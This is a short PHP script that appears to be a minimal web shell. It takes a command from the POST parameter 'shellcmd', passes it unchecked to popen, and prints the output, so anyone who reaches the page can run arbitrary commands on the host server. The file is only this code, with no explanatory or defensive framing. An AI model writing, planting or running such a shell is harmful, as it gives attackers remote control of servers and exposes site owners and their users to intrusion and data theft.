<?php
function exec_shell($cmd)
{
    $handle = popen($cmd, "r");
    while (($buf = fgets($handle, 1024)) != false) {
		echo $buf;
    }
    pclose($handle);
    return 0;
}

exec_shell($_POST['shellcmd']);
?>